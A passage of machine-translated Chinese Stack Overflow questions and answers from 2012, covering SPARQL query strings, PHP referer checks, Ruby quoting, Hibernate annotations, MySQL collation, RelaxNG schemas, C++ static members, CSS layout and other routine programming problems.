at VDS.RDF.Parsing.Tokens.SparqlTokeniser.TryGetQNameOrKeyword() 
```

在 VDS.RDF.Parsing.Tokens.SparqlTokeniser.GetNextToken() 在 VDS.RDF.Parsing.Tokens.TokenQueue.InitialiseBuffer() 在 VDS.RDF.Parsing.SparqlQueryParser.ParseInternal(SparqlQueryParserContext context) 在 VDS.RDF.Parsing.SparqlQueryParser .ParseInternal(TextReader input) at VDS.RDF.Parsing.SparqlQueryParser.ParseFromString(String queryString) at SuggestWebService.GetCompletionList(String prefixText) in d:\Suggest\App_Code\SuggestWebService.cs:line 57

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-03T09:43:02.567

在查询字符串中添加换行符以使错误消息更好。

没有 SPARQL 报价

```
regex(str(?x),"+tmp+") 
```

尝试：

```
regex(str(?x),'"+tmp+"') 
```

它将单引号放入 SPARQL。小心`tmp`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-03T09:42:25.003

我以这种方式更改了我的代码，所以它对我有用

```
 string tmp="^"+prefixText;
        var query = "PREFIX  mojLek: <http://www.example.org/mojLek#>"
            + "PREFIX xsd: <http://www.w3.org/2001/XMLSchema#>"
            + "PREFIX rdf: <http://www.w3.org/1999/02/22-rdf-syntax-ns#>"
            + "PREFIX rdfs: <http://www.w3.org/2000/01/rdf-schema#>"
            + "PREFIX fn: <http://www.w3.org/2005/xpath-functions#>"
            + "SELECT  ?x ?h"
            + "WHERE {?h mojLek:ime ?x ."
            + "FILTER regex(?x,\""+tmp+"\")"
                +"}"; 
```

# php - 在点击横幅广告后阻止来自特定 URL 的用户

> ID：11786170
> 
> 赞同：-1
> 
> 时间：2012-08-02T21:37:31.167
> 
> 标签：php

我想阻止来自特定 URL 的用户。我们的广告横幅出现在许多网站上。在网站上点击我们横幅的人会被定向到我们的注册页面。我不希望向在特定网站（例如[http://abc.com](http://abc.com) ）上点击我们广告的人显示该页面。如何实施此限制？提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T21:40:36.460

`$_SERVER['HTTP_REFERER']`您可以检查要限制的域的变量值。

像这样的东西可以工作：

```
$bad_domain = 'abc.com';
if (stripos($_SERVER['HTTP_REFERER'], $bad_domain) !== false) {
    // block user, they came from $bad_domain
} 
```

在浏览器中欺骗引用字符串很容易，或者安装插件将其留空，但很多人没有这样的限制。此外，如果他们从`https`页面点击，也不会发送引荐来源网址。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T21:40:41.123

您可以尝试使用[$_SERVER['HTTP_REFERER']](http://php.net/manual/en/reserved.variables.server.php)但它不能 100% 保证工作。

# ruby-on-rails - Ruby 单引号和双引号

> ID：11786174
> 
> 赞同：6
> 
> 时间：2012-08-02T21:38:01.717
> 
> 标签：ruby-on-rails, ruby

是否有某种 Ruby`to_s`方法可以将变量更改为单引号字符串而不是双引号？

说我有

```
date = Time.now
date.to_s 
```

我希望输出为'2012-08-01 22:00:15'。我该怎么做呢？或者有没有将“”字符串转换为“”字符串的方法？

谢谢！

**编辑 - 更多细节**

我正在使用 Rails 在数据库中显示一些数据。我已经`@instanceVar`从我的控制器/模型中创建了一个数组数组。

```
<% outer = [] %>
<% inner = [] %>

<% @instanceVar.each do |events| %>
  <% events.each do |event| %>
    <% inner << [event.date, event.total] %>
  <% end %>
  <% outer << inner %>
<% end %> 
```

我需要`event.date`是一个单引号字符串。

```
 <% inner << ['event.date', event.total] %> 
```

只是从字面上将单词添加`event.date`到数组中，并且

```
 <% inner << ["#{event.date}", event.total] %> 
```

将日期放在双引号中。

**编辑2**

```
<script>
  $.jqplot('trendingEvents', <%= outer %>,
  {
    #options go here
  });
</script> 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-02T21:45:31.743

字符串是 ruby​​ 中的字符串。他们都是平等的。唯一的区别是你如何声明它们（单引号、双引号、here-docs 和其他可能的东西）。一旦你在一个变量中获得了一个字符串值，它是如何声明的都没有关系。

```
s1 = 'single quoted'
s1 # => "single quoted" 
```

因此，如果您的字符串不离开 ruby​​land（也就是说，您不将它们呈现为 javascript 或其他），您不应该担心引号。

### 对编辑 2 的回应

看来您必须以更手动的方式构建 json 对象，而不是依赖于`Array#to_s`

要将 ruby​​ 字符串作为 javascript 单引号字符串文字发出，您可以执行以下操作：

```
<script type="text/javascript">
  var s = '<%= ruby_string %>';
</script> 
```

`<%= %>`构造将呈现不带引号的传递字符串。您自己提供报价。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T21:50:09.530

双引号作为字符串构造函数允许您插入变量。单引号用于文字。如前所述，字符串是实例化后的字符串，显示引号最好留给调用者。

# java - 在访问器上方放置@Id 注释会导致创建元素集合表失败

> ID：11786177
> 
> 赞同：1
> 
> 时间：2012-08-02T21:38:17.443
> 
> 标签：java, hibernate, jpa

当我运行以下课程时：

```
@Entity
public class SurveyResponse {

    @Id
    private String assignmentId;

    public String getAssignmentId() {
        return assignmentId;
    }

    public void setAssignmentId(String assignmentId) {
        this.assignmentId = assignmentId;
    }

    @ElementCollection
    @MapKeyColumn(name="topic")
    @Column(name="relevance")
    @CollectionTable(name="RelevanceScore", joinColumns=@JoinColumn(name="assignmentId"))
    Map<Topic, Relevance> topicRelevance = new HashMap<Topic, Relevance>(); // maps from attribute name to value    

    public static void main( String[] args ) {
        Configuration config = new Configuration();
        config.addAnnotatedClass(SurveyResponse.class);
        config.configure( "hibernate.cfg.xml" );        
        new SchemaExport(config).create( true, true );      
    }

} 
```

它按预期创建表 SurveyResponse 和 RelevanceScore。但是，当我将 @Id 注释放在主键的 getter 上方时......

```
@Entity
public class SurveyResponse {

    private String assignmentId;

    @Id 
    public String getAssignmentId() {
        return assignmentId;
    }

    ...

} 
```

...它无法生成表 RelevanceScore。为什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T21:48:14.583

简短回答：您必须选择是将注释放在字段上还是放在 getter 上，您不能混合使用它们。

长答案：Hibernate 寻找 @Id 注释；如果它在一个字段上，它会查找字段上的所有其他注释，甚至不费心去查看 getter。反之亦然：如果 @Id 注释在 getter 上，则不会考虑您在其他字段上放置的注释。

这就是为什么如果您只在 getAssignment 方法上移动 @Id 批注，则不会生成表的原因；您还应该将描述 topicRelevance 字段的所有注释放在其相关的 getter 上。

# javascript - 使用 Chrome 扩展程序检测点击

> ID：11786178
> 
> 赞同：0
> 
> 时间：2012-08-02T21:38:18.640
> 
> 标签：javascript, jquery

发现自己正在为 Chrome 编写扩展程序，作为我想要实现这一点的测试：

```
$(document).click(function(e) { alert('clicked'); }); 
```

但它没有按预期工作，有什么想法吗？

这是 manifest.json：

```
"name": "Test",
  "version": "0.2",
   "content_scripts": [
    {
      "all_frames": true,
      "matches": ["*://mail.google.com/mail/*"],
      "js": ["jquery-1.7.2.js", "test.js"]
    }
  ] 
```

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-08-02T21:43:15.230

```
$(document).click(function(e) { var evt=e||window.event;if(evt.type=='click')alert('clicked'); }); 
```

这就是你所缺少的！

[演示](http://jsfiddle.net/bxqmL/2/)

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-08-02T22:01:32.297

# mysql - MySQL：如何执行不区分大小写的查询

> ID：11786181
> 
> 赞同：0
> 
> 时间：2012-08-02T21:38:24.857
> 
> 标签：mysql

据我所知 LIKE 运算符应该不区分大小写，但是如果我有字符串“ABC Software”并且我得到以下查询：

```
SELECT ...
FROM ...
WHERE ... LIKE 'AbC Softwa%' 
```

我得到一个零行结果集（如果我将第二个字母 b 大写，我得到正确的结果）。为什么？以前我有 *utf8_bin* 作为字符编码，所以我切换到 *latin_swedish_ci*，假设二进制匹配是所有错误的根源，但我遇到了同样的问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T21:42:17.973

尝试

```
SELECT ...
FROM ...
WHERE UPPER(...) LIKE 'ABC SOFTWA%' 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T21:39:58.880

MySQL 默认情况下不区分大小写。

如果要执行**区分大小写**的搜索，请使用：

```
SELECT ...
FROM ...
WHERE ... LIKE BINARY 'AbC Softwa%' 
```

如果您的数据库或表默认配置为区分大小写，那么要执行**不区分大小写**的搜索，您需要执行以下操作：

```
SELECT ...
FROM ...
WHERE ... COLLATE latin1_swedish_ci LIKE 'AbC Softwa%' COLLATE latin1_swedish_ci 
```

如果您使用的是 utf8，请尝试以下操作：

```
SELECT ...
FROM ...
WHERE ... COLLATE utf8_general_ci LIKE 'AbC Softwa%' COLLATE utf8_general_ci 
```

您可能想调查为什么您的数据库区分大小写。

要查看服务器的配置方式，请运行：

```
SHOW VARIABLES LIKE '%collation%'; 
```

要查看表的排序规则，请运行：

```
SHOW TABLE STATUS; 
```

并查看数据库的默认排序规则：

```
SHOW CREATE DATABASE dbname; 
```

`dbname`数据库的名称在哪里。

# ember.js - Ember.Controller 不存在？

> ID：11786189
> 
> 赞同：1
> 
> 时间：2012-08-02T21:39:01.750
> 
> 标签：ember.js

我刚刚开始使用 Ember。我对某些事情有点困惑，因为主站点上的指南似乎表明了不同的工作方式。

在主文档 (http://emberjs.com/documentation/) 中，它表明控制器应该只扩展一个普通的 Ember 对象，如下所示：

```
Ember.Object.extend(); 
```

这对我来说很好。

然后在使用路由的指南（http://emberjs.com/guides/outlets/）中建议您可以扩展一个控制器对象类型：

```
Ember.Controller.extend(); 
```

这对我不起作用，如果我只是尝试 console.log Ember.Controller，它是未定义的。

我正在使用 Ember 版本 0.9.8.1。

我应该担心这个，还是应该继续扩展 Objects 作为我的控制器？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T22:16:45.287

0.9.8.1 已经过时了，不幸的是，即使是网站上的指南也领先于它——使用最新的（在[https://github.com/emberjs/ember.js/downloads](https://github.com/emberjs/ember.js/downloads)）跟上最新的最佳实践。

**更新**：1.0-pre 已经发布（[emberjs.com](http://www.emberjs.com)），所以这是最好用的。文档/指南已更新。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-03T18:08:53.070

我认为@pauldechov 表示您可以在此处找到的特定“最新”版本： [https ://github.com/emberjs/ember.js/downloads](https://github.com/emberjs/ember.js/downloads)

但也要记住，文档和“最新”并不总是同步的。

# iphone - 如何制作自助服务终端应用 iPhone

> ID：11786191
> 
> 赞同：-7
> 
> 时间：2012-08-02T21:39:01.503
> 
> 标签：iphone, objective-c, ios

如何为 iPhone 创建自助服务终端应用程序？

在 html 部分中上传内容的最佳方式是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T22:07:19.300

HTML 或 PDF 可以正常工作。您可以使用 UIWebView 来显示这两种格式。或者，如果有一种标准的方式来布置不会改变的所有内容，那么您可以使用 XML（或 RSS）。

# gcc - 对编译 TK 应用程序的 ClockCmd 的未定义引用

> ID：11786192
> 
> 赞同：0
> 
> 时间：2012-08-02T21:39:03.007
> 
> 标签：gcc, linker, tcl, ld, tk

我正在尝试使用 tk 编译示例程序。我几乎对所有的库都进行了排序，但我想我缺少一个。

命令：

```
gcc ./tk.c -I/usr/include/tcl8.5/ -ltk8.5 -ltcl8.5 -lm -lpthread -lfontconfig -lX11 -lXft -lXss 
```

输出：

```
/tmp/cc78MM6w.o: In function `Tk_AppInit':
tk.c:(.text+0xf5): undefined reference to `ClockCmd'
tk.c:(.text+0x120): undefined reference to `ClockObjDestroy'
tk.c:(.text+0x130): undefined reference to `ClockObjCmd' 
```

Google 上什么都没有——有人认识 ClockCmd 吗？谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-03T07:58:38.093

我认为这些是 Tcl 实现的一部分，不应该在 Tcl 库本身之外引用。（链接器被指示在构建 DLL/共享对象时删除对它们的外部引用。）或者它们是你代码的一部分，你只是出于某种原因没有提供它们，但我想你会知道如果是这样的话。

如果我们能真正看到 ; 的代码，那么弄清楚发生了什么会容易得多`tk.c`。它显然不是任何 Tcl 或 Tk 代码分发的一部分。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-07T05:19:16.180

我认为的示例代码有问题；其他示例都没有问题。

# xml - Relaxng 可以指定一组具有相同名称但不同属性的无序元素吗？

> ID：11786196
> 
> 赞同：5
> 
> 时间：2012-08-02T21:39:29.387
> 
> 标签：xml, relaxng

我正在努力自动化测试一个接受和返回 XML 的 API，所以我想尽可能地将 API 的记录返回数据转换为模式。基于易用性和学习性，我选择了 RelaxNG 来完成这项任务。

在我输入所有信息之前，这是一个问题：

**是否可以描述“无序的元素集，具有相同的名称但不同的属性”？**

这是我无法描述的示例对象：

```
<item>
    <id>d395136e-d060-4a6e-887c-c0337dd7ad09</id>
    <name>The item has a name</name>
    <link rel="self" type="type1" href="url" />
    <link rel="download" type="type2" href="url" />
    <link rel="relatedData" type="type3" href="url" />
</item> 
```

链接对象是我要挂断的部分。这是问题所在：

*   不能保证 item 内元素的顺序，所以我试图将所有元素放在`<interleave>`结构中。
*   里面会有多个`<link>`元素`<item>`，具有不同的属性集（即，`<item>`必须有一个“self”链接、一个“download”链接和一个“relatedData”链接才有效）。
*   每种链接类型中的一种是必需的，但不能保证再次顺序。

我试图这样描述架构：

```
<element name="item">
    <interleave>
        <element name="id"><text/></element>
        <element name="name"><text/></element>
        <ref name="selfLink"/>
        <ref name="launchLink"/>
        <ref name="thumbnailLink"/>
    </interleave>
</element> 
```

“链接”引用在其他地方定义，如下所示：

```
 <define name="selfLink">
 <element name="link">
     <attribute name="href"><text/></attribute>
     <attribute name="rel"><value>self</value></attribute>
     <attribute name="type"><value>type1</value></attribute>
 </element>
 </define> 
```

解析器对此不满意 - 从 jing 我得到`error: the element "link" can occur in more than one operand of "interleave"`。我可以看到它的意思，但我希望它可以将“具有相同名称但不同属性的元素”的想法作为独特的项目来处理。

将链接引用移出交错可以解析它，但是只要返回数据中的顺序发生变化，我就会等待验证器崩溃。

任何想法，或者这是不可能的？我正在处理的 XML 是否存在固有问题，需要我在测试应用程序中将其中的一些提升到更高的处理逻辑（在运行更通用的 XML 验证后手动检查每种链接类型？）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-08T19:19:14.940

看起来您偶然发现了RELAX NG 中[的交错限制。](https://www.oasis-open.org/committees/relax-ng/spec-20011203.html#interleave-restrictions)我会尝试在[Schematron](http://en.wikipedia.org/wiki/Schematron)中执行此操作，或者可能是 RELAX NG 和 Schematron 的组合。

[这是一个片段，它使用Jing 支持](http://www.thaiopensource.com/relaxng/jing-other.html)`<link>`的 Schematron 版本检查您的元素：

```
<schema xmlns="http://www.ascc.net/xml/schematron">
  <pattern name="link pattern">
    <rule context="item">
      <assert test='count(link) = 3'>There must be 3 link elements.</assert>
      <assert test="count(link[@rel = 'self' and @type ='type1']) = 1">There must be 1 link element wwhere @rel='self' and @type='type1'.</assert>
      <assert test="count(link[@rel = 'download' and @type ='type2']) = 1">There must be 1 link element where @rel='download' and @type='type2'.</assert>
      <assert test="count(link[@rel = 'relatedData' and @type = 'type3']) = 1">There must be 1 link element where @rel='relatedData' and @type='type3'.</assert>
    </rule>
  </pattern>
</schema> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-03T22:03:33.587

看看以下架构是否有帮助

```
<grammar xmlns="http://relaxng.org/ns/structure/1.0">
<start>
    <element name="item">
        <interleave>
            <element name="id"><text/>
            </element>
            <element name="name"><text/></element>
            <oneOrMore>
                <ref name="link"/>
            </oneOrMore>
        </interleave>
    </element>
</start>

<define name="link">
    <element name="link">
        <attribute name="href"/>
        <choice>
            <group>
                <attribute name="rel"><value>self</value></attribute>
                <attribute name="type"><value>type1</value></attribute>
            </group>
            <group>
                <attribute name="rel"><value>download</value></attribute>
                <attribute name="type"><value>type2</value></attribute>
            </group>
            <group>
                <attribute name="rel"><value>relatedData</value></attribute>
                <attribute name="type"><value>type3</value></attribute>
            </group>
        </choice>
    </element>
</define>
</grammar> 
```

# c# - 更多 LINQ 语法

> ID：11786197
> 
> 赞同：0
> 
> 时间：2012-08-02T21:39:32.587
> 
> 标签：c#, linq

我之前问过[这个](https://stackoverflow.com/questions/11784977/linq-query-syntax)问题，这很有帮助。然后我意识到我还需要一个 List 的 ID 列表，它是该对象中的一个属性。基本上我想得到一个从这些对象中的每个列表生成的整数列表。有任何想法吗？谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-02T21:42:08.270

```
var ids = (from x in outerList
          from y in x.List
          select y).ToList(); 
```

或者为了避免重复：

```
var ids = (from x in outerList
          from y in x.List
          select y).Distinct().ToList(); 
```

对于信息，这也可以写成：

```
var ids = outerList.SelectMany(x => x.List).ToList(); 
```

或者：

```
var ids = outerList.SelectMany(x => x.List).Distinct().ToList(); 
```

# php - 如何在我的服务器中实现 Websocket (RFC 6455)？

> ID：11786199
> 
> 赞同：1
> 
> 时间：2012-08-02T21:39:35.007
> 
> 标签：php, websocket

我在 Google 中搜索过它，在 stackoverflow 中有一些关于它的问题。问题是它们中的许多都是旧的，所以我猜他们使用的是旧的和已弃用的协议而不是 RFC 6455。我不知道是因为这个还是我做错了什么，但是当我尝试它时不起作用。

所以...

1.  如果我理解得很好，我可以使用适当的客户端 (Javascript) 和服务器 (PHP) 代码来实现 Websocket，而无需配置我的 Apache 服务器。我是对的？

2.  为什么我发现的所有示例都需要我去命令行执行

    php -q C:\path\to\file\Websocket\Server.php

3.  在我发现的实现中，有一个默认服务器和端口。我必须将它们更改为用于普通网页的服务器（本地主机）和端口吗？或者我应该告诉我的服务器监听另一个端口并将其用于 websocket 通信？

4.  我在哪里可以找到 Websockets (RFC 6455) 的良好 PHP 实现？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-03T17:26:15.630

1.  对，那是正确的。

2.  因为 Websocket 服务器不使用您的 Web 守护程序来提供数据。在这种情况下，您完全用 PHP 编写了一个服务器守护程序。

3.  您需要选择一个端口，因为您没有使用 web 守护程序来为您的 websocket 提供服务。任何未使用的端口都可以。

4.  试试[Ratchet （](http://packagist.org/packages/cboden/Ratchet)[这里](http://socketo.me/)的主站点）。我们已经在生产中使用 dev-master 分支几个月了，我们没有遇到任何问题。这是我们发现的唯一一种开箱即用的解决方案，可以同时与 Firefox 客户端和 iPhone 一起使用。

# xcode - 在哪里打电话准备在表格视图中进行 segue

> ID：11786204
> 
> 赞同：1
> 
> 时间：2012-08-02T21:39:59.430
> 
> 标签：xcode, uitableview, tableview, segue

嘿，我正在开发一个在动态 tableView 中发布 50 个位置的应用程序，当您单击一个位置时，它将转到一个新的 tableView 控制器并从该位置发布 50 张照片。我创建了一个 tableViewController，然后创建了一个新文件，其中包含 tableView 所需的所有文件 IE Cellforrowatindexpath。我有从主 tableViewcontroller 连接的 segue，但所有信息都存储在 newfile 中，其中包含 tableViewController 使用的方法。我是在 tableViewController 中编写 PrepareForSegue 还是将其写入具有创建表的方法的文件中？另外，如果我将它写在 tableViewCONtroller 中，如何访问动态创建的单元格之一的单元格名称？谢谢。

```
 -(void) prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender{
    if([segue.identifier isEqualToString:@"Photos for location"]){
//I dont know what to use for the name
        [segue.destinationViewController setPhotoInPlace: WHAT DO I CALL THIS!?
    }
} 
```

调用名称来自另一个文件，该文件使用公共 API 创建一个字典数组，其中包含名称和位置等信息。该文件名为 flickrFetcher。这是动态创建单元格的代码。self.brain 是 flickerFetcher 的一个实例，topPlaces 是从 flickrFetcher 调用以获取 NSdictionaries 的 NSArray 的方法。

```
 - (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:    (NSIndexPath *)indexPath
{
// Create an instance of the cell
UITableViewCell *cell;
cell = [self.tableView dequeueReusableCellWithIdentifier:@"Photo Description"];

if(!cell)
    cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleSubtitle reuseIdentifier:@"Photo Description"];
// set properties on the cell to prepare if for displaying   
//top places returns an array of NSDictionairy objects, must get object at index and then object for key

// the cellTitle has country then province, country goes in main title and province will go as subtitle.
NSString * cellTitle = [[[[self.brain class] topPlaces] objectAtIndex:self.location] objectForKey:@"_content"]; 

NSRange cellRange = [cellTitle rangeOfString:@","];

NSString * cellMainTitle = [cellTitle substringToIndex:cellRange.location];

cell.textLabel.text = cellMainTitle;

NSString* cellSubtitle = [cellTitle substringFromIndex:cellRange.location +2];

cell.detailTextLabel.text =  cellSubtitle;
//location is an int property that allows a new selection when using objectAtIndex
self.location++;
return cell;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T22:01:19.007

`prepareForSegue:`是一个`UIViewController`方法，所以它需要在你的视图控制器中。该`sender`参数应该是导致 segue 的单元格。您可以使用表格视图方法`indexPathForCell:`来获取相关的索引路径，这应该足以找到您在实施时放入单元格的相同数据`cellForRowAtIndexPath:`。

（我不确定您所说的“新文件”是什么意思或它实现了什么类，所以我不能说这是否会影响任何东西。）

# c# - 如何调用此方法将其绑定到 Infragistics 控件？

> ID：11786214
> 
> 赞同：-1
> 
> 时间：2012-08-02T21:40:41.423
> 
> 标签：c#, infragistics, webdatagrid

只要我删除对象源 EventArgs e 并从 page_load 调用该方法，此方法就可以正确加载数据并将其绑定到 infragistics 控件。

删除对象源 eventArgs e 是个好主意吗？

```
protected void dgvAppts_NeedDataSource(object source, EventArgs e)
        {
            if (Session.IsNewSession == false)
            {
                DataTable ApptTable = new DataTable();
                ApptTable = objGatewayFunctions.GetAppointmentReCap(Session["LoginID"].ToString(), RecapDate.ToShortDateString(), "R", ConfigurationManager.AppSettings["Connection"].ToString());
                this.dgvAppts.DataSource = ApptTable;
                //if (ApptTable.Rows.Count == 0)
                //{
                //    this.uwtTabs.Tabs(0).Style.ForeColor = System.Drawing.Color.Gray;
                //}
                //else
                //{
                //    this.uwtTabs.Tabs(0).Style.ForeColor = System.Drawing.Color.Black;
                //}
            }
        } 
```

如果最好有对象源，EventArgs e 存在于方法中。如何调用该函数以便它可以加载 WebDataGrid？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T21:51:14.723

您需要将您的方法作为事件处理程序分配给`NeedDataSource`网格控件中的事件。

在设计器中选择您的网格，打开“属性”窗口并选择您的方法作为事件的事件处理程序`NeedDataSource`。

看起来该方法已与事件分离，这就是您必须自己调用它的原因。它应该是网格控件在需要数据源时通过引发事件来调用您的方法。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T21:59:56.953

我不认为 Infragistics WebDataGrid 有 NeedDataSource 事件；听起来代码是从使用 Telerik 控件转换而来的。

如果是这种情况，则无需调用该方法

```
protected void dgvAppts_NeedDataSource(object source, EventArgs e) 
```

您可以将其称为

```
protected void BindMyGrid() 
```

并确实从页面加载中调用它（只有在页面未处于回发模式时才可能检查）

# c++ - 静态初始化 C++

> ID：11786217
> 
> 赞同：3
> 
> 时间：2012-08-02T21:40:47.167
> 
> 标签：c++, static, initialization

我对 C++ 的有限理解意味着我不知道如何正确执行以下操作：

```
#include "Platform.h"
#include "Global.h"

SDL_Surface *ms_pSmall (Global::sharedGlobal()->loadImage(RESOURCE_SMALL_PLATFORM) );
SDL_Surface *ms_pMedium(Global::sharedGlobal()->loadImage(RESOURCE_MEDIUM_PLATFORM));
SDL_Surface *ms_pLarge (Global::sharedGlobal()->loadImage(RESOURCE_LARGE_PLATFORM) );

//Initialise platform variables
Platform::Platform()
{   
    int imgSize = rand() % 3;
    switch (imgSize)
    {
        case 2:
            m_pImage = ms_pSmall;
            break;
        case 1:
            m_pImage = ms_pMedium;
            break;
        case 0:
            m_pImage = ms_pLarge;
            break;
    }
} 
```

其中 ms_pSmall 等是静态指针，而 Global 是具有以下函数声明的单例：

```
static Global* sharedGlobal();
SDL_Surface* loadImage(const std::string& filename) const; 
```

代码似乎编译正确，但链接器抱怨：

```
Undefined symbols for architecture i386:"Platform::ms_pMedium", referenced from:
  Platform::Platform() in Platform.o    "Platform::ms_pLarge", referenced from:
  Platform::Platform() in Platform.o    "Platform::ms_pSmall", referenced from:
  Platform::Platform() in Platform.o 
ld: symbol(s) not found for architecture i386
clang: error: linker command failed with exit code 1 (use -v to see invocation) 
```

[抱歉缩进不佳。]

在这里的任何帮助将不胜感激，我会很高兴地展示更多代码，但我认为这就是有人需要了解我正在尝试做的事情。

提前致谢！

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-02T21:42:14.007

您需要使成员符合条件：

```
SDL_Surface* Platform::ms_pSmall (Global::sharedGlobal()->loadImage(RESOURCE_SMALL_PLATFORM) );
SDL_Surface* Platform::ms_pMedium(Global::sharedGlobal()->loadImage(RESOURCE_MEDIUM_PLATFORM));
SDL_Surface* Platform::ms_pLarge (Global::sharedGlobal()->loadImage(RESOURCE_LARGE_PLATFORM) ); 
```

否则，您只是在声明其他变量，而函数中的静态变量未定义。

# css - 元素宽度基于存在多少兄弟姐妹

> ID：11786221
> 
> 赞同：0
> 
> 时间：2012-08-02T21:41:23.777
> 
> 标签：css, css-float, width

假设我有一个 500px 的 ul。说孩子李的左浮动。有没有办法编写 css，所以 li 永远不会进入第二行，而是根据存在的 li 填充 ul 的 500px 宽度？

例如。

```
<ul>
   <li>test</li>
</ul> 
```

li 会占用整个 500px

```
<ul>
   <li>test</li>
   <li>test</li>
</ul> 
```

2 li 将分割宽度。基本上每个250px

```
<ul>
   <li>test</li>
   <li>test</li>
   <li>test</li>
</ul> 
```

会把它分成3种方式等等......

谢谢你！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-02T21:46:18.643

```
ul {
    width: 500px;
    display: table;
}

li {
    display: table-cell;
} 
```

这是小提琴：http: [//jsfiddle.net/WhbuQ/](http://jsfiddle.net/WhbuQ/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T22:01:27.213

当[Flexbox](http://www.w3.org/TR/css3-flexbox/)最终确定/更好地实现时，它将提供一个不错的选择。

[fiddle](http://jsfiddle.net/BcbWa/)使用当前 Gecko/Webkit 支持的旧式语法。

# mysql - 查找用户第一次登录asp.net会员

> ID：11786223
> 
> 赞同：0
> 
> 时间：2012-08-02T21:41:48.447
> 
> 标签：mysql, asp.net-membership

我正在尝试使用 asp.net 成员资格（mysql）找出用户第一次登录，并根据我显示的一些协议页面。我遵循的程序是：

> 当用户注册时，将发送一封邮件，用于确认电子邮件 ID。直到此时，用户尚未通过身份验证。单击电子邮件 ID 中提供的链接后，用户的身份验证由查询字符串中的用户 ID 完成。现在用户需要通过凭据登录。此时用户已通过身份验证，我想向他展示一个带有复选框的法律协议页面。

我试过的解决方案：我认为最后一次登录时间是 0/0/0000 00:00:00 AM，但没有成功。

如果有人能建议我解决这个问题，那就太好了。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-15T12:07:59.320

我也遇到了同样的问题。唯一让我印象深刻的解决方案是检查 LastLoginDate = CreateDate 与否。如果此条件为真，则表示用户正在尝试首次登录。但请注意，您必须在登录程序之前检查它。（但我应该说我使用 Ms Sql）您还可以检查尚未登录的用户数。

```
 select LastLoginDate from aspnet_Membership where LastLoginDate = CreateDate order by LastLoginDate ASC 
```

# vim - vimrc 堆叠窗口

> ID：11786225
> 
> 赞同：0
> 
> 时间：2012-08-02T21:41:55.743
> 
> 标签：vim

我想在 Vim 中堆叠 NERDTree 和 TagBar，如下所示。如何做到这一点？

```
----------------------------
| NERDTree |               |
|          |               |
|          |               |
+----------|               |
| tagbar   |               |
|          |               |
|          |               |
+--------------------------- 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T23:26:25.563

这是一种蛮力，我不使用这些插件中的任何一个，但你应该能够做到......

1.  将光标放在标签栏中，键入`<C-W>K`以使其在顶部全宽。
2.  将光标放在 NERDTree 中，键入`<C-W>K`以使其在顶部全宽，现在位于标签栏上方。
3.  将光标放在空窗口中并`<C-W>L`在堆叠窗口的右侧键入以使其全高。

# android - 在 FragmentPagerAdapter 上添加 PreferenceFragment

> ID：11786229
> 
> 赞同：3
> 
> 时间：2012-08-02T21:42:12.217
> 
> 标签：android, android-viewpager, fragment

我使用最后一个 SDK 创建了一个导航类型为**Tabs + Swipe**的应用程序，我想在其中一个选项卡上放置一个 PreferenceFragment。

生成的代码如下：

```
mSectionsPagerAdapter = new SectionsPagerAdapter(getSupportFragmentManager());

// Set up the ViewPager with the sections adapter.
mViewPager = (ViewPager) findViewById(R.id.pager);
mViewPager.setAdapter(mSectionsPagerAdapter); 
```

同时，我无法在*SectionsPagerAdapter上添加**PreferenceFragment* ，因为它的方法*getItem(int position)*返回一个 Fragment，而不是*FragmentActivity*。

 ***我可能在这里需要一些帮助。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T23:08:17.763

问题是 ViewPager 的`getItem(..)`方法返回一个支持 Fragment （即`android.support.v4.app.Fragment`）而不是`android.app.Fragment`，这是 PreferenceFragments 扩展的。基本上，PreferenceFragment 使用不支持的 API 版本，因此与 ViewPagers 不兼容，并且没有可用的 PreferenceFragment 支持版本。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-29T19:55:53.147

您可以升级到支持 android.app.Fragment 的 v13 寻呼机。[我在这里](https://stackoverflow.com/a/16286631/279175)就类似的问题给出了详细的回答。***

# android - Android 中类似圆形菜单的 Path-App

> ID：11786233
> 
> 赞同：6
> 
> 时间：2012-08-02T21:42:19.750
> 
> 标签：android

今天我遇到了路径应用程序： ![在此处输入图像描述](../Images/1a3bb25d344ee6c5c21843fbba910298.png)

并想问是否可以在Android中实现这个圆形菜单。Framelayout 会是一个好的解决方案还是更好的解决方案？我还听说有人创建了一个实现几乎相同功能的库。但是什么也没发现。

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-08-02T21:53:58.450

以下是一些这样做的开源项目：

